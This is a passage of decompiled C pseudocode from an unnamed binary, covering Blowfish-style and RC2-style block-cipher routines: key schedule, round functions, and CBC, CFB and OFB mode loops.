                                                       * (unsigned __int8)((unsigned __int16)((*(_WORD *)(a2 + 4 * (unsigned __int8)(*(_BYTE *)(a2 + 68) ^ *(_BYTE *)a1) + 3144)
                                                                                             + (*(_WORD *)(a2 + 4 * v2 + 2120) ^ (*(_WORD *)(a2 + 4 * ((unsigned int)(*(_DWORD *)(a2 + 68) ^ *(_DWORD *)a1) >> 24) + 72) + *(_WORD *)(a2 + 4 * (unsigned __int8)((unsigned int)(*(_DWORD *)(a2 + 68) ^ *(_DWORD *)a1) >> 16) + 1096)))) ^ *(_WORD *)(a2 + 64) ^ *(_WORD *)(a1 + 4)) >> 8)
                                                       + 2120) ^ (*(_WORD *)(a2 + 4 * HIBYTE(v3) + 72)
                                                                + *(_WORD *)(a2 + 4 * BYTE2(v3) + 1096)))) ^ *(_WORD *)(a2 + 60) ^ *(_WORD *)(a2 + 68) ^ *(_WORD *)a1) >> 8);
  v6 = (*(_DWORD *)(a2 + 4 * (unsigned __int8)v4 + 3144)
      + (*(_DWORD *)(a2 + 4 * v5 + 2120) ^ (*(_DWORD *)(a2 + 4 * HIBYTE(v4) + 72)
                                          + *(_DWORD *)(a2 + 4 * BYTE2(v4) + 1096)))) ^ *(_DWORD *)(a2 + 56) ^ v3;
  LOBYTE(v5) = BYTE1(v6);
  v7 = (*(_DWORD *)(a2 + 4 * (unsigned __int8)v6 + 3144)
      + (*(_DWORD *)(a2 + 4 * v5 + 2120) ^ (*(_DWORD *)(a2 + 4 * HIBYTE(v6) + 72)
                                          + *(_DWORD *)(a2 + 4 * BYTE2(v6) + 1096)))) ^ *(_DWORD *)(a2 + 52) ^ v4;
  LOBYTE(v5) = BYTE1(v7);
  v8 = (*(_DWORD *)(a2 + 4 * (unsigned __int8)v7 + 3144)
      + (*(_DWORD *)(a2 + 4 * v5 + 2120) ^ (*(_DWORD *)(a2 + 4 * HIBYTE(v7) + 72)
                                          + *(_DWORD *)(a2 + 4 * BYTE2(v7) + 1096)))) ^ *(_DWORD *)(a2 + 48) ^ v6;
  LOBYTE(v5) = BYTE1(v8);
  v9 = (*(_DWORD *)(a2 + 4 * (unsigned __int8)v8 + 3144)
      + (*(_DWORD *)(a2 + 4 * v5 + 2120) ^ (*(_DWORD *)(a2 + 4 * HIBYTE(v8) + 72)
                                          + *(_DWORD *)(a2 + 4 * BYTE2(v8) + 1096)))) ^ *(_DWORD *)(a2 + 44) ^ v7;
  LOBYTE(v5) = BYTE1(v9);
  v10 = (*(_DWORD *)(a2 + 4 * (unsigned __int8)v9 + 3144)
       + (*(_DWORD *)(a2 + 4 * v5 + 2120) ^ (*(_DWORD *)(a2 + 4 * HIBYTE(v9) + 72)
                                           + *(_DWORD *)(a2 + 4 * BYTE2(v9) + 1096)))) ^ *(_DWORD *)(a2 + 40) ^ v8;
  LOBYTE(v5) = BYTE1(v10);
  v11 = (*(_DWORD *)(a2 + 4 * (unsigned __int8)v10 + 3144)
       + (*(_DWORD *)(a2 + 4 * v5 + 2120) ^ (*(_DWORD *)(a2 + 4 * HIBYTE(v10) + 72)
                                           + *(_DWORD *)(a2 + 4 * BYTE2(v10) + 1096)))) ^ *(_DWORD *)(a2 + 36) ^ v9;
  LOBYTE(v5) = BYTE1(v11);
  v12 = (*(_DWORD *)(a2 + 4 * (unsigned __int8)v11 + 3144)
       + (*(_DWORD *)(a2 + 4 * v5 + 2120) ^ (*(_DWORD *)(a2 + 4 * HIBYTE(v11) + 72)
                                           + *(_DWORD *)(a2 + 4 * BYTE2(v11) + 1096)))) ^ *(_DWORD *)(a2 + 32) ^ v10;
  LOBYTE(v5) = BYTE1(v12);
  v13 = (*(_DWORD *)(a2 + 4 * (unsigned __int8)v12 + 3144)
       + (*(_DWORD *)(a2 + 4 * v5 + 2120) ^ (*(_DWORD *)(a2 + 4 * HIBYTE(v12) + 72)
                                           + *(_DWORD *)(a2 + 4 * BYTE2(v12) + 1096)))) ^ *(_DWORD *)(a2 + 28) ^ v11;
  LOBYTE(v5) = BYTE1(v13);
  v14 = (*(_DWORD *)(a2 + 4 * (unsigned __int8)v13 + 3144)
       + (*(_DWORD *)(a2 + 4 * v5 + 2120) ^ (*(_DWORD *)(a2 + 4 * HIBYTE(v13) + 72)
                                           + *(_DWORD *)(a2 + 4 * BYTE2(v13) + 1096)))) ^ *(_DWORD *)(a2 + 24) ^ v12;
  LOBYTE(v5) = BYTE1(v14);
  v15 = (*(_DWORD *)(a2 + 4 * (unsigned __int8)v14 + 3144)
       + (*(_DWORD *)(a2 + 4 * v5 + 2120) ^ (*(_DWORD *)(a2 + 4 * HIBYTE(v14) + 72)
                                           + *(_DWORD *)(a2 + 4 * BYTE2(v14) + 1096)))) ^ *(_DWORD *)(a2 + 20) ^ v13;
  LOBYTE(v5) = BYTE1(v15);
  v16 = (*(_DWORD *)(a2 + 4 * (unsigned __int8)v15 + 3144)
       + (*(_DWORD *)(a2 + 4 * v5 + 2120) ^ (*(_DWORD *)(a2 + 4 * HIBYTE(v15) + 72)
                                           + *(_DWORD *)(a2 + 4 * BYTE2(v15) + 1096)))) ^ *(_DWORD *)(a2 + 16) ^ v14;
  LOBYTE(v5) = BYTE1(v16);
  v17 = (*(_DWORD *)(a2 + 4 * (unsigned __int8)v16 + 3144)
       + (*(_DWORD *)(a2 + 4 * v5 + 2120) ^ (*(_DWORD *)(a2 + 4 * HIBYTE(v16) + 72)
                                           + *(_DWORD *)(a2 + 4 * BYTE2(v16) + 1096)))) ^ *(_DWORD *)(a2 + 12) ^ v15;
  LOBYTE(v5) = BYTE1(v17);
  v18 = (*(_DWORD *)(a2 + 4 * (unsigned __int8)v17 + 3144)
       + (*(_DWORD *)(a2 + 4 * v5 + 2120) ^ (*(_DWORD *)(a2 + 4 * HIBYTE(v17) + 72)
                                           + *(_DWORD *)(a2 + 4 * BYTE2(v17) + 1096)))) ^ *(_DWORD *)(a2 + 8) ^ v16;
  LOBYTE(v5) = BYTE1(v18);
  result = a1;
  v20 = (*(_DWORD *)(a2 + 4 * (unsigned __int8)v18 + 3144)
       + (*(_DWORD *)(a2 + 4 * v5 + 2120) ^ (*(_DWORD *)(a2 + 4 * HIBYTE(v18) + 72)
                                           + *(_DWORD *)(a2 + 4 * BYTE2(v18) + 1096)))) ^ *(_DWORD *)(a2 + 4) ^ v17;
  v21 = *(_DWORD *)a2 ^ v18;
  *(_DWORD *)(a1 + 4) = v20;
  *(_DWORD *)a1 = v21;
  return result;
}

//----- (004B2FC0) --------------------------------------------------------
unsigned __int32 __cdecl sub_4B2FC0(int *a1, int a2, int a3, int a4, int *a5, int a6)
{
  int v6; // esi
  unsigned int v9; // ebp
  unsigned __int32 result; // eax
  unsigned __int32 v11; // ebx
  unsigned __int32 v12; // ebx
  int v13; // ecx
  int v14; // edx
  unsigned int v15; // ebp
  unsigned __int32 v16; // ebx
  unsigned __int32 v17; // edx
  unsigned __int32 v18; // ebx
  unsigned __int32 v19; // ecx
  int v20; // edx
  unsigned int *v21; // [esp-8h] [ebp-28h]
  int v22; // [esp-4h] [ebp-24h]
  int v23; // [esp+0h] [ebp-20h] BYREF
  unsigned int v24; // [esp+4h] [ebp-1Ch]
  unsigned __int32 v25; // [esp+8h] [ebp-18h]
  unsigned int v26; // [esp+Ch] [ebp-14h]

  v6 = *a5;
  v26 = a5[1];
  v25 = v6;
  v24 = v26;
  v23 = v6;
  v22 = a4;
  v21 = (unsigned int *)&v23;
  if ( a6 )
  {
    v9 = a3 & 0xFFFFFFF8;
    result = v23;
    v11 = v24;
    if ( (a3 & 0xFFFFFFF8) != 0 )
    {
      do
      {
        v12 = _byteswap_ulong(a1[1] ^ v11);
        v23 = _byteswap_ulong(*a1 ^ result);
        v24 = v12;
        sub_4B2780((int)v21, v22);
        result = _byteswap_ulong(v23);
        v11 = _byteswap_ulong(v24);
        *(_DWORD *)a2 = result;
        *(_DWORD *)(a2 + 4) = v11;
        a1 += 2;
        a2 += 8;
        v9 -= 8;
      }
      while ( v9 );
    }
    if ( (a3 & 7) != 0 )
    {
      while ( 2 )
      {
        v13 = 0;
        v14 = 0;
        switch ( a3 & 7 )
        {
          case 0:
            continue;
          case 1:
            goto LABEL_12;
          case 2:
            goto LABEL_11;
          case 3:
            BYTE1(v13) = *((_BYTE *)a1 + 2);
            v13 <<= 8;
LABEL_11:
            BYTE1(v13) = *((_BYTE *)a1 + 1);
LABEL_12:
            LOBYTE(v13) = *(_BYTE *)a1;
            goto LABEL_13;
          case 4:
            goto LABEL_9;
          case 5:
            goto LABEL_8;
          case 6:
            goto LABEL_7;
          case 7:
            BYTE1(v14) = *((_BYTE *)a1 + 6);
            v14 <<= 8;
LABEL_7:
            BYTE1(v14) = *((_BYTE *)a1 + 5);
LABEL_8:
            LOBYTE(v14) = *((_BYTE *)a1 + 4);
LABEL_9:
            v13 = *a1;
LABEL_13:
            v23 = _byteswap_ulong(v13 ^ result);
            v24 = _byteswap_ulong(v14 ^ v11);
            sub_4B2780((int)v21, v22);
            result = _byteswap_ulong(v23);
            v11 = _byteswap_ulong(v24);
            *(_DWORD *)a2 = result;
            *(_DWORD *)(a2 + 4) = v11;
            break;
        }
        break;
      }
    }
  }
  else
  {
    v15 = a3 & 0xFFFFFFF8;
    result = v25;
    v11 = v26;
    if ( (a3 & 0xFFFFFFF8) != 0 )
    {
      do
      {
        v16 = _byteswap_ulong(a1[1]);
        v23 = _byteswap_ulong(*a1);
        v24 = v16;
        sub_4B2BA0((int)v21, v22);
        v17 = _byteswap_ulong(v24) ^ v26;
        result = *a1;
        v11 = a1[1];
        *(_DWORD *)a2 = _byteswap_ulong(v23) ^ v25;
        *(_DWORD *)(a2 + 4) = v17;
        v25 = result;
        v26 = v11;
        a1 += 2;
        a2 += 8;
        v15 -= 8;
      }
      while ( v15 );
    }
    if ( (a3 & 7) != 0 )
    {
      v18 = _byteswap_ulong(a1[1]);
      v23 = _byteswap_ulong(*a1);
      v24 = v18;
      sub_4B2BA0((int)v21, v22);
      v19 = _byteswap_ulong(v23) ^ v25;
      result = *a1;
      v11 = a1[1];
      v20 = __ROR4__(_byteswap_ulong(v24) ^ v26, 16);
      *(_BYTE *)(a2 + 6) = v20;
      *(_WORD *)(a2 + 4) = HIWORD(v20);
      *(_DWORD *)a2 = v19;
    }
  }
  *a5 = result;
  a5[1] = v11;
  return result;
}
// 4B3018: variable 'v21' is possibly undefined
// 4B3018: variable 'v22' is possibly undefined

//----- (004B3200) --------------------------------------------------------
int *__cdecl sub_4B3200(char *a1, _BYTE *a2, int a3, int a4, int a5, int *a6, int a7)
{
  int *result; // eax
  int v8; // ebp
  int v9; // esi
  int v10; // edx
  unsigned int v11; // ecx
  int v12; // ecx
  char v13; // al
  int v14; // edx
  unsigned int v15; // ecx
  int v16; // ecx
  char v17; // al
  char v18; // cl
  unsigned int v19; // [esp+10h] [ebp-8h] BYREF
  int v20; // [esp+14h] [ebp-4h]

  result = a6;
  v8 = a3;
  v9 = *a6;
  if ( !a7 )
  {
    if ( a3 )
    {
      do
      {
        --v8;
        if ( !v9 )
        {
          v14 = *(unsigned __int8 *)(a5 + 5);
          v19 = _byteswap_ulong(*(_DWORD *)a5);
          v20 = (v14 << 16) | (*(unsigned __int8 *)(a5 + 4) << 24) | *(unsigned __int8 *)(a5 + 7) | (*(unsigned __int8 *)(a5 + 6) << 8);
          sub_4B2780((int)&v19, a4);
          v15 = v19;
          *(_BYTE *)a5 = HIBYTE(v19);
          *(_BYTE *)(a5 + 1) = BYTE2(v15);
          *(_BYTE *)(a5 + 2) = BYTE1(v15);
          *(_BYTE *)(a5 + 3) = v15;
          v16 = v20;
          *(_BYTE *)(a5 + 4) = HIBYTE(v20);
          *(_BYTE *)(a5 + 5) = BYTE2(v16);
          *(_BYTE *)(a5 + 6) = BYTE1(v16);
          *(_BYTE *)(a5 + 7) = v16;
        }
        v17 = *a1++;
        v18 = *(_BYTE *)(v9 + a5);
        *(_BYTE *)(v9 + a5) = v17;
        *a2 = v18 ^ v17;
        v9 = ((_BYTE)v9 + 1) & 7;
        ++a2;
      }
      while ( v8 );
      result = a6;
    }
    goto LABEL_12;
  }
  if ( !a3 )
  {
LABEL_12:
    *result = v9;
    return result;
  }
  do
  {
    --v8;
    if ( !v9 )
    {
      v10 = *(unsigned __int8 *)(a5 + 5);
      v19 = _byteswap_ulong(*(_DWORD *)a5);
      v20 = (v10 << 16) | (*(unsigned __int8 *)(a5 + 4) << 24) | *(unsigned __int8 *)(a5 + 7) | (*(unsigned __int8 *)(a5 + 6) << 8);
      sub_4B2780((int)&v19, a4);
      v11 = v19;
      *(_BYTE *)a5 = HIBYTE(v19);
      *(_BYTE *)(a5 + 1) = BYTE2(v11);
      *(_BYTE *)(a5 + 2) = BYTE1(v11);
      *(_BYTE *)(a5 + 3) = v11;
      v12 = v20;
      *(_BYTE *)(a5 + 4) = HIBYTE(v20);
      *(_BYTE *)(a5 + 5) = BYTE2(v12);
      *(_BYTE *)(a5 + 6) = BYTE1(v12);
      *(_BYTE *)(a5 + 7) = v12;
    }
    v13 = *(_BYTE *)(v9 + a5) ^ *a1++;
    *a2 = v13;
    *(_BYTE *)(v9 + a5) = v13;
    v9 = ((_BYTE)v9 + 1) & 7;
    ++a2;
  }
  while ( v8 );
  result = a6;
  *a6 = v9;
  return result;
}

//----- (004B3400) --------------------------------------------------------
_BYTE *__cdecl sub_4B3400(int a1, _BYTE *a2, int a3, int a4)
{
  int v4; // edx
  unsigned int v5; // ecx
  int v6; // ecx
  _BYTE *result; // eax
  unsigned int v8; // [esp+0h] [ebp-8h] BYREF
  int v9; // [esp+4h] [ebp-4h]

  v4 = *(unsigned __int8 *)(a1 + 5);
  v8 = _byteswap_ulong(*(_DWORD *)a1);
  v9 = (v4 << 16) | (*(unsigned __int8 *)(a1 + 4) << 24) | *(unsigned __int8 *)(a1 + 7) | (*(unsigned __int8 *)(a1 + 6) << 8);
  if ( a4 )
    sub_4B2780((int)&v8, a3);
  else
    sub_4B2BA0((int)&v8, a3);
  v5 = v8;
  *a2 = HIBYTE(v8);
  a2[1] = BYTE2(v5);
  a2[2] = BYTE1(v5);
  a2[3] = v5;
  v6 = v9;
  a2[4] = HIBYTE(v9);
  a2[5] = BYTE2(v6);
  result = a2 + 6;
  a2[6] = BYTE1(v6);
  a2[7] = v6;
  return result;
}

//----- (004B34D0) --------------------------------------------------------
_BYTE *__cdecl sub_4B34D0(_BYTE *a1, _BYTE *a2, int a3, int a4, unsigned __int8 *a5, int *a6)
{
  int v6; // esi
  int v7; // edx
  int v8; // ecx
  int v9; // ecx
  int v10; // edx
  int v11; // ebx
  unsigned int v13; // edx
  _BYTE *result; // eax
  _BYTE *v16; // eax
  int v17; // [esp+10h] [ebp-28h]
  int v18; // [esp+18h] [ebp-20h]
  int v19; // [esp+1Ch] [ebp-1Ch] BYREF
  unsigned int v20; // [esp+20h] [ebp-18h]
  int v21; // [esp+24h] [ebp-14h]
  _BYTE *v22; // [esp+28h] [ebp-10h]
  char v23; // [esp+2Ch] [ebp-Ch]
  char v24; // [esp+2Dh] [ebp-Bh]
  char v25; // [esp+2Eh] [ebp-Ah]
  char v26; // [esp+2Fh] [ebp-9h]
  char v27; // [esp+30h] [ebp-8h]
  char v28; // [esp+31h] [ebp-7h]
  char v29; // [esp+32h] [ebp-6h]
  char v30; // [esp+33h] [ebp-5h]

  v21 = a4;
  v6 = *a6;
  v7 = a5[1];
  v18 = a3;
  v8 = *a5;
  v22 = a5 + 1;
  v9 = a5[3] | (a5[2] << 8) | (v7 << 16) | (v8 << 24);
  v10 = (a5[5] << 16) | (a5[4] << 24);
  v11 = a5[7] | (a5[6] << 8);
  v23 = HIBYTE(v9);
  v24 = BYTE2(v9);
  v13 = v11 | v10;
  v25 = BYTE1(v9);
  v27 = HIBYTE(v13);
  v28 = BYTE2(v13);
  result = (_BYTE *)(v13 >> 8);
  v17 = 0;
  v19 = v9;
  v20 = v13;
  v26 = v9;
  v29 = BYTE1(v13);
  v30 = v13;
  if ( a3 )
  {
    do
    {
      --v18;
      if ( !v6 )
      {
        sub_4B2780((int)&v19, v21);
        v9 = v19;
        v23 = HIBYTE(v19);
        v24 = BYTE2(v19);
        v25 = BYTE1(v19);
        v13 = v20;
        v27 = HIBYTE(v20);
        v28 = BYTE2(v20);
        ++v17;
        v26 = v19;
        v29 = BYTE1(v20);
        v30 = v20;
      }
      *a2++ = *a1++ ^ *(&v23 + v6);
      v6 = ((_BYTE)v6 + 1) & 7;
    }
    while ( v18 );
    if ( v17 )
    {
      *a5 = HIBYTE(v9);
      v16 = v22;
      *v22 = BYTE2(v9);
      *++v16 = BYTE1(v9);
      v16[1] = v9;
      v16 += 2;
      *v16++ = HIBYTE(v13);
      *v16 = BYTE2(v13);
      result = v16 + 1;
      *result = BYTE1(v13);
      result[1] = v13;
    }
    else
    {
      result = a6;
    }
    *a6 = v6;
  }
  else
  {
    *a6 = v6;
  }
  return result;
}

//----- (004B36C0) --------------------------------------------------------
int __cdecl sub_4B36C0(char *a1, int a2, unsigned __int8 *a3)
{
  int v4; // ecx
  unsigned __int8 *v5; // eax
  unsigned int v6; // ecx
  _DWORD *v7; // esi
  int v8; // edx
  unsigned __int8 *v9; // eax
  int v10; // ebp
  unsigned __int8 *v11; // eax
  int v12; // edx
  int v13; // ebp
  unsigned __int8 *v14; // eax
  int v15; // edx
  int v16; // ebp
  unsigned __int8 *v17; // eax
  int v18; // edx
  int v19; // edx
  unsigned __int8 *v20; // eax
  int v21; // ebp
  unsigned __int8 *v22; // eax
  int v23; // edx
  int v24; // ebp
  unsigned __int8 *v25; // eax
  int v26; // edx
  int v27; // ebp
  unsigned __int8 *v28; // eax
  int v29; // edx
  int v30; // edx
  unsigned __int8 *v31; // eax
  int v32; // ebp
  unsigned __int8 *v33; // eax
  int v34; // edx
  int v35; // ebp
  unsigned __int8 *v36; // eax
  int v37; // edx
  int v38; // ebp
  int v39; // edx
  int i; // esi
  int v41; // edx
  int j; // esi
  int result; // eax
  int v44; // edx
  int v45; // [esp+8h] [ebp-8h] BYREF
  int v46; // [esp+Ch] [ebp-4h]
  int v47; // [esp+14h] [ebp+4h]

  memcpy(a1, &unk_5277E0, 0x1048u);
  v4 = a2;
  if ( a2 > 72 )
    v4 = 72;
  v5 = a3;
  v6 = (unsigned int)&a3[v4];
  v7 = a1 + 8;
  v47 = 6;
  do
  {
    v8 = *v5;
    v9 = v5 + 1;
    if ( (unsigned int)v9 >= v6 )
      v9 = a3;
    v10 = *v9;
    v11 = v9 + 1;
    v12 = v10 | (v8 << 8);
    if ( (unsigned int)v11 >= v6 )
      v11 = a3;
    v13 = *v11;
    v14 = v11 + 1;
    v15 = v13 | (v12 << 8);
    if ( (unsigned int)v14 >= v6 )
      v14 = a3;
    v16 = *v14;
    v17 = v14 + 1;
    v18 = v16 | (v15 << 8);
    if ( (unsigned int)v17 >= v6 )
      v17 = a3;
    *(v7 - 2) ^= v18;
    v19 = *v17;
    v20 = v17 + 1;
    if ( (unsigned int)v20 >= v6 )
      v20 = a3;
    v21 = *v20;
    v22 = v20 + 1;
    v23 = v21 | (v19 << 8);
    if ( (unsigned int)v22 >= v6 )
      v22 = a3;
    v24 = *v22;
    v25 = v22 + 1;
    v26 = v24 | (v23 << 8);
    if ( (unsigned int)v25 >= v6 )
      v25 = a3;
    v27 = *v25;
    v28 = v25 + 1;
    v29 = v27 | (v26 << 8);
    if ( (unsigned int)v28 >= v6 )
      v28 = a3;
    *(v7 - 1) ^= v29;
    v30 = *v28;
    v31 = v28 + 1;
    if ( (unsigned int)v31 >= v6 )
      v31 = a3;
    v32 = *v31;
    v33 = v31 + 1;
    v34 = v32 | (v30 << 8);
    if ( (unsigned int)v33 >= v6 )
      v33 = a3;
    v35 = *v33;
    v36 = v33 + 1;
    v37 = v35 | (v34 << 8);
    if ( (unsigned int)v36 >= v6 )
      v36 = a3;
    v38 = *v36;
    v5 = v36 + 1;
    v39 = v38 | (v37 << 8);
    if ( (unsigned int)v5 >= v6 )
      v5 = a3;
    *v7 ^= v39;
    v7 += 3;
    --v47;
  }
  while ( v47 );
  v45 = 0;
  v46 = 0;
  for ( i = 0; i < 18; i += 2 )
  {
    sub_4B2780((int)&v45, (int)a1);
    v41 = v46;
    *(_DWORD *)&a1[4 * i] = v45;
    *(_DWORD *)&a1[4 * i + 4] = v41;
  }
  for ( j = 0; j < 1024; j += 2 )
  {
    result = sub_4B2780((int)&v45, (int)a1);
    v44 = v46;
    *(_DWORD *)&a1[4 * j + 72] = v45;
    *(_DWORD *)&a1[4 * j + 76] = v44;
  }
  return result;
}

//----- (004B3830) --------------------------------------------------------
int *__cdecl sub_4B3830(int *a1, int a2)
{
  unsigned int v2; // edx
  int v3; // ebp
  int v4; // esi
  unsigned int v5; // ecx
  int v6; // edi
  unsigned int v7; // edx
  unsigned int v8; // esi
  int v9; // eax
  int v10; // ebp
  int v11; // eax
  int v12; // eax
  int *result; // eax
  int v14; // [esp+10h] [ebp-8h]
  int v15; // [esp+14h] [ebp-4h]

  v2 = a1[1];
  v3 = a2;
  LOWORD(v4) = *a1;
  v5 = HIWORD(*a1);
  v6 = (unsigned __int16)v2;
  v7 = HIWORD(v2);
  v14 = 3;
  v15 = 5;
  while ( 1 )
  {
    do
    {
      v8 = (unsigned __int16)(v4 + *(_WORD *)v3 + (v6 & v7) + (v5 & ~(_WORD)v7));
      v4 = (2 * v8) | (v8 >> 15);
      v9 = *(_DWORD *)(v3 + 4) + (v4 & v7) + (v6 & ~v4);
      v10 = v3 + 4;
      v5 = (4 * (unsigned __int16)(v5 + v9)) | ((unsigned __int16)(v5 + v9) >> 14);
      v11 = *(_DWORD *)(v10 + 4) + (v4 & v5) + (v7 & ~v5);
      v10 += 4;
      v6 = (8 * (unsigned __int16)(v6 + v11)) | ((unsigned __int16)(v6 + v11) >> 13);
      v12 = *(_DWORD *)(v10 + 4) + (v5 & v6) + (v4 & ~v6);
      v7 = (32 * (unsigned __int16)(v7 + v12)) | ((unsigned __int16)(v7 + v12) >> 11);
      v3 = v10 + 8;
      --v15;
    }
    while ( v15 );
    if ( !--v14 )
      break;
    v15 = (v14 == 2) + 5;
    v4 += *(_DWORD *)(a2 + 4 * (v7 & 0x3F));
    v5 += *(_DWORD *)(a2 + 4 * (v4 & 0x3F));
    v6 += *(_DWORD *)(a2 + 4 * (v5 & 0x3F));
    v7 += *(_DWORD *)(a2 + 4 * (v6 & 0x3F));
  }
  result = a1;
  *a1 = (unsigned __int16)v4 | (v5 << 16);
  a1[1] = (unsigned __int16)v6 | (v7 << 16);
  return result;
}

//----- (004B3970) --------------------------------------------------------
int __cdecl sub_4B3970(int *a1, int a2)
{
  unsigned int v2; // eax
  unsigned int v3; // edi
  unsigned int v4; // esi
  unsigned int v5; // ecx
  unsigned int v6; // eax
  int v7; // edx
  _DWORD *v8; // ebp
  int v9; // ebx
  _DWORD *v10; // ebp
  int v11; // ebx
  int v12; // ebx
  int v13; // ebx
  int result; // eax
  int v15; // [esp+10h] [ebp-8h]

  v2 = a1[1];
  v3 = (unsigned __int16)*a1;
  v4 = (unsigned __int16)v2;
  v5 = HIWORD(*a1);
  v6 = HIWORD(v2);
  v15 = 3;
  v7 = 5;
  v8 = (_DWORD *)(a2 + 252);
  while ( 1 )
  {
    do
    {
      v9 = ((v6 >> 5) | (v6 << 11)) - (v3 & ~v4) - (v5 & v4) - *v8;
      v10 = v8 - 1;
      v6 = (unsigned __int16)v9;
      v11 = ((v4 >> 3) | (v4 << 13)) - ((unsigned __int16)v9 & ~v5) - (v3 & v5) - *v10--;
      v4 = (unsigned __int16)v11;
      v12 = ((v5 >> 2) | (v5 << 14)) - ((unsigned __int16)v11 & ~v3) - (v3 & v6) - *v10--;
      v5 = (unsigned __int16)v12;
      v13 = ((v3 >> 1) | (v3 << 15)) - ((unsigned __int16)v12 & ~v6) - (v4 & v6) - *v10;
      v8 = v10 - 1;
      --v7;
      v3 = (unsigned __int16)v13;
    }
    while ( v7 );
    if ( !--v15 )
      break;
    LOBYTE(v7) = v15 == 2;
    v6 = (unsigned __int16)(v6 - *(_WORD *)(a2 + 4 * (v4 & 0x3F)));
    v7 += 5;
    v4 = (unsigned __int16)(v4 - *(_WORD *)(a2 + 4 * (v5 & 0x3F)));
    v5 = (unsigned __int16)(v5 - *(_WORD *)(a2 + 4 * (v13 & 0x3F)));
    v3 = (unsigned __int16)(v13 - *(_WORD *)(a2 + 4 * (v6 & 0x3F)));
  }
  *a1 = (unsigned __int16)v13 | (v5 << 16);
  result = (unsigned __int16)v4 | (v6 << 16);
  a1[1] = result;
  return result;
}

//----- (004B3AD0) --------------------------------------------------------
unsigned int __cdecl sub_4B3AD0(unsigned __int8 *a1, _BYTE *a2, unsigned int a3, int a4, unsigned __int16 *a5, int a6)
{
  int v6; // ecx
  _BYTE *v7; // esi
  unsigned __int8 *v8; // edi
  unsigned int v9; // eax
  unsigned int v10; // edx
  int v11; // eax
  int v12; // edx
  unsigned __int8 *v13; // edi
  int v14; // eax
  int v15; // edx
  int v16; // eax
  int v17; // edx
  int v18; // ebp
  int v19; // eax
  int v20; // edx
  int v21; // ebp
  int v22; // edx
  int v23; // ebp
  int v24; // edx
  int v25; // eax
  _BYTE *v26; // esi
  int v27; // edi
  int v28; // ebp
  int v29; // eax
  int v30; // ebp
  int v31; // eax
  int v32; // edx
  int v33; // eax
  int v34; // eax
  int v35; // edx
  int v36; // edx
  int v37; // eax
  _BYTE *v38; // esi
  unsigned int result; // eax
  _BYTE *v40; // edi
  unsigned __int8 *v41; // esi
  int v42; // ebx
  unsigned int v43; // eax
  bool v44; // sf
  unsigned int v45; // ecx
  int v46; // eax
  int v47; // ecx
  unsigned __int8 *v48; // esi
  int v49; // edx
  int v50; // edx
  int v51; // eax
  int v52; // ecx
  int v53; // ecx
  int v54; // eax
  _BYTE *v55; // edi
  bool v56; // zf
  int v57; // eax
  int v58; // ecx
  unsigned __int8 *v59; // esi
  int v60; // edx
  int v61; // ebx
  int v62; // eax
  int v63; // edi
  int v64; // [esp+10h] [ebp-14h]
  int v65; // [esp+10h] [ebp-14h]
  unsigned int v66; // [esp+14h] [ebp-10h]
  int v67; // [esp+14h] [ebp-10h]
  int v68; // [esp+14h] [ebp-10h]
  unsigned int v69; // [esp+18h] [ebp-Ch]
  int v70; // [esp+1Ch] [ebp-8h] BYREF
  unsigned int v71; // [esp+20h] [ebp-4h]
  unsigned int v72; // [esp+30h] [ebp+Ch]
  unsigned int v73; // [esp+30h] [ebp+Ch]
  unsigned int v74; // [esp+3Ch] [ebp+18h]
  unsigned int v75; // [esp+3Ch] [ebp+18h]

  if ( a6 )
  {
    v6 = (*((unsigned __int8 *)a5 + 3) << 24) | (*((unsigned __int8 *)a5 + 2) << 16) | *a5;
    v7 = a2;
    v8 = a1;
    v9 = (*((unsigned __int8 *)a5 + 7) << 24) | (*((unsigned __int8 *)a5 + 6) << 16) | a5[2];
    v10 = a3 - 8;
    v74 = v9;
    if ( (int)(a3 - 8) >= 0 )
    {
      v66 = a3 >> 3;
      v72 = v10 - 8 * (a3 >> 3);
      do
      {
        v11 = *v8;
        v12 = v8[1];
        v13 = v8 + 1;
        v14 = (v12 << 8) | v11;
        v15 = *++v13;
        v16 = (v15 << 16) | v14;
        v17 = *++v13;
        v18 = v13[1];
        v19 = (v17 << 24) | v16;
        v20 = (++v13)[1];
        ++v13;
        v21 = (v20 << 8) | v18;
        v22 = *++v13;
        v23 = (v22 << 16) | v21;
        v24 = v13[1];
        v70 = v6 ^ v19;
        v8 = v13 + 2;
        v71 = v74 ^ ((v24 << 24) | v23);
        sub_4B3830(&v70, a4);
        v25 = v70;
        *v7 = v70;
        v26 = v7 + 1;
        *v26++ = BYTE1(v25);
        *v26++ = BYTE2(v25);
        v6 = v25;
        *v26 = HIBYTE(v25);
        v9 = v71;
        *++v26 = v71;
        *++v26 = BYTE1(v9);
        *++v26 = BYTE2(v9);
        ++v26;
        v74 = v9;
        *v26 = HIBYTE(v9);
        v7 = v26 + 1;
        --v66;
      }
      while ( v66 );
      v10 = v72;
    }
    if ( v10 != -8 )
    {
      v27 = (int)&v8[v10 + 8];
      v28 = 0;
      v29 = 0;
      switch ( v10 )
      {
        case 0xFFFFFFF9:
          goto LABEL_15;
        case 0xFFFFFFFA:
          goto LABEL_14;
        case 0xFFFFFFFB:
          goto LABEL_13;
        case 0xFFFFFFFC:
          goto LABEL_12;
        case 0xFFFFFFFD:
          goto LABEL_11;
        case 0xFFFFFFFE:
          goto LABEL_10;
        case 0xFFFFFFFF:
          goto LABEL_9;
        case 0u:
          v30 = *(unsigned __int8 *)--v27;
          v28 = v30 << 24;
LABEL_9:
          v31 = *(unsigned __int8 *)--v27;
          v28 |= v31 << 16;
LABEL_10:
          v32 = *(unsigned __int8 *)--v27;
          v28 |= v32 << 8;
LABEL_11:
          v33 = *(unsigned __int8 *)--v27;
          v28 |= v33;
LABEL_12:
          v34 = *(unsigned __int8 *)--v27;
          v29 = v34 << 24;
LABEL_13:
          v35 = *(unsigned __int8 *)--v27;
          v29 |= v35 << 16;
LABEL_14:
          v36 = *(unsigned __int8 *)--v27;
          v29 |= v36 << 8;
LABEL_15:
          v29 |= *(unsigned __int8 *)(v27 - 1);
          break;
        default:
          break;
      }
      v70 = v6 ^ v29;
      v71 = v74 ^ v28;
      sub_4B3830(&v70, a4);
      v37 = v70;
      *v7 = v70;
      v38 = v7 + 1;
      *v38++ = BYTE1(v37);
      *v38 = BYTE2(v37);
      v6 = v37;
      *++v38 = HIBYTE(v37);
      v9 = v71;
      v38[1] = v71;
      v38 += 2;
      *v38++ = BYTE1(v9);
      *v38 = BYTE2(v9);
      v38[1] = HIBYTE(v9);
    }
    *(_DWORD *)a5 = v6;
